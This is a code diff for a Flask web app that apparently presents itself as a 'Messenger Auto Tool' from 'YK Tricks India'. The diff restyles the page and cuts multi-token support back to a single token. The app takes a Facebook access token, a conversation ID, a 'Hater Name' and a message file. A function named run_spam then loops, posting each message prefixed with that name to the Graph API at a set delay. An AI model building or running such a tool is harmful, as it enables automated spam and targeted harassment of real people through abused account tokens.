@@ -23,81 +23,98 @@ running = False
 def index():
     html_code = '''
     <!DOCTYPE html>
-    <html>
+    <html lang="en">
     <head>
         <title>YK Tricks India</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
         <style>
             body {
-                background-image: url('https://images.unsplash.com/photo-1607083207630-f694d68a1b2f?fit=crop&w=1950&q=80');
+                font-family: 'Poppins', sans-serif;
+                background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
+                color: #fff;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
                 background-size: cover;
                 background-position: center;
                 background-repeat: no-repeat;
-                min-height: 100vh;
             }
-            .container {
-                background-color: rgba(255, 255, 255, 0.9);
-                padding: 20px;
-                border-radius: 15px;
-                box-shadow: 0px 0px 10px gray;
-                margin-top: 50px;
+            .form-container {
+                background-color: rgba(255, 255, 255, 0.05);
+                padding: 30px;
+                border-radius: 20px;
+                width: 100%;
+                max-width: 400px;
+                box-shadow: 0 0 10px rgba(0,0,0,0.3);
             }
-            .header {
+            h1 {
+                font-weight: bold;
+                color: #ff00cc;
                 text-align: center;
+            }
+            h5 {
+                color: #fff;
+                text-align: center;
+                margin-bottom: 25px;
+            }
+            input, select {
+                background-color: rgba(255, 255, 255, 0.1);
+                color: white;
+                border: none;
+                padding: 10px;
+                margin-bottom: 15px;
+                width: 100%;
+                border-radius: 10px;
+            }
+            input::placeholder {
+                color: #ccc;
+            }
+            button {
+                background: linear-gradient(to right, #ff00cc, #3333ff);
+                border: none;
+                padding: 12px;
+                width: 100%;
+                border-radius: 10px;
+                color: #fff;
+                font-weight: bold;
             }
             .footer {
                 text-align: center;
-                color: black;
-                margin-top: 20px;
+                margin-top: 15px;
+                font-size: 0.8rem;
+            }
+            .footer a {
+                color: #00f7ff;
+                text-decoration: none;
             }
         </style>
     </head>
     <body>
-        <div class="container">
-            <div class="header">
-                <h1>🚀 YK Tricks India ✨</h1>
-                <h3>Owner: Mr. YK Tricks India ❤️</h3>
-            </div>
+        <div class="form-container">
+            <h1>🚀 YK TRICKS INDIA</h1>
+            <h5>Messenger Auto Tool 🔥</h5>
             <form action="/" method="post" enctype="multipart/form-data">
-                <div class="mb-3">
-                    <label>Select Token Type:</label>
-                    <select class="form-control" name="tokenType" required>
-                        <option value="single">Single Token</option>
-                        <option value="multi">Multi Token</option>
-                    </select>
-                </div>
-                <div class="mb-3">
-                    <label>Enter Your Token:</label>
-                    <input type="text" class="form-control" name="accessToken">
-                </div>
-                <div class="mb-3">
-                    <label>Enter Convo/Inbox ID:</label>
-                    <input type="text" class="form-control" name="threadId" required>
-                </div>
-                <div class="mb-3">
-                    <label>Enter Hater Name:</label>
-                    <input type="text" class="form-control" name="kidx" required>
-                </div>
-                <div class="mb-3">
-                    <label>Select Your Notepad File:</label>
-                    <input type="file" class="form-control" name="txtFile" accept=".txt" required>
-                </div>
-                <div class="mb-3">
-                    <label>Select Token File (for multi-token):</label>
-                    <input type="file" class="form-control" name="tokenFile" accept=".txt">
-                </div>
-                <div class="mb-3">
-                    <label>Speed in Seconds:</label>
-                    <input type="number" class="form-control" name="time" required>
-                </div>
-                <button type="submit" class="btn btn-primary">Start</button>
+                <select name="tokenType" required>
+                    <option value="single">Single Token</option>
+                    <option value="multi">Multi Token</option>
+                </select>
+                <input type="text" name="accessToken" placeholder="EAAB..." required>
+                <input type="text" name="threadId" placeholder="Enter Thread/Inbox ID" required>
+                <input type="text" name="kidx" placeholder="Enter Hater Name" required>
+                <label class="text-light small">Upload Message File (.txt)</label>
+                <input type="file" name="txtFile" accept=".txt" required>
+                <input type="number" name="time" placeholder="Delay (in seconds)" required>
+                <button type="submit">💬 Start Auto Messaging</button>
             </form>
             <form action="/stop" method="post">
-                <button type="submit" class="btn btn-danger w-100 mt-3">🛑 STOP</button>
+                <button type="submit" class="mt-2 btn btn-danger w-100">🛑 STOP</button>
             </form>
-            <div class="footer">
-                <p>&copy; YK Tricks India 2024</p>
-                <p>Inbox Tool | Enjoy!</p>
+            <div class="footer mt-3">
+                <p>&copy; 2024 – YK Tricks India | All Rights Reserved 🌐<br>
+                Telegram: <a href="https://t.me/yktricksindia" target="_blank">@yktricksindia</a></p>
             </div>
         </div>
     </body>
@@ -120,12 +137,6 @@ def process_form():
     txt_file = request.files['txtFile']
     messages = txt_file.read().decode().splitlines()
 
-    tokens = []
-    if token_type == 'multi':
-        token_file = request.files.get('tokenFile')
-        if token_file:
-            tokens = token_file.read().decode().splitlines()
-
     folder_name = f"Convo_{thread_id}"
     os.makedirs(folder_name, exist_ok=True)
 
@@ -135,10 +146,6 @@ def process_form():
         f.write(f"Speed (s): {time_interval}\n")
         f.write("\n".join(messages))
 
-    if tokens:
-        with open(os.path.join(folder_name, "tokens.txt"), "w") as f:
-            f.write("\n".join(tokens))
-
     def run_spam():
         post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
 
@@ -146,8 +153,7 @@ def process_form():
             global running
             if not running:
                 break
-            token = access_token if token_type == 'single' else tokens[message_index % len(tokens)]
-            data = {'access_token': token, 'message': f"{hater_name} {message}"}
+            data = {'access_token': access_token, 'message': f"{hater_name} {message}"}
             response = requests.post(post_url, json=data, headers=headers)
 
             if response.ok:
@@ -169,4 +175,3 @@ def stop():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-            
